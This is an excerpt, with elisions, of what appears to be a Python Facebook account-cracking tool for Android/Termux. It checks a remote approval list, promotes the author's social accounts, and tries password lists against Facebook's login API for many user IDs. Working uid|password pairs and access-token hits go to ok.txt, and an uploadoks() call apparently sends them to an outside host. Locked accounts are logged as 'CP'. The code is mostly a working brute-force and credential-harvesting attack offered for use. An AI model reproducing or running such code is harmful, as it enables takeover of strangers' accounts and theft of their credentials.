...
def helpnote():
	print("%s [*] FOLLOW ME ON FB ACCOUNT ABOUT UPDATES  :)"%(G))
	subprocess.check_output(["am", "start", "https://m.me/zihad.hossain36"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/zihad.hossain36")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801842827520")
	subprocess.check_output(["am", "start", "https://wa.me/+8801842827520"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/MR-ZIHAD/Approved/blob/main/Approved.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;91m..:::::..::..:::::..::
 ...
 > \033[0;96mDEVELOPER     : RAFI VAU
 > \033[0;96mTEAM OF HT   :  ANTI_VIRUS
 > \033[0;96mWHATSAPP      : +8801842827520
 \033[0;96m> GITHUB        : MR-ZIHAD
 > \033[0;96mWARNING       : BAD USE IS PROHIBITED      
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: M+RAFI): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [RAFI] : %s/%s -> \033[0;92m [ RAFI-OK:%s ]- \033[0;93m[RAFI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [RAFI-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[RAFI-CP] %s|%s\033[0;97m         "%(uid, pw))
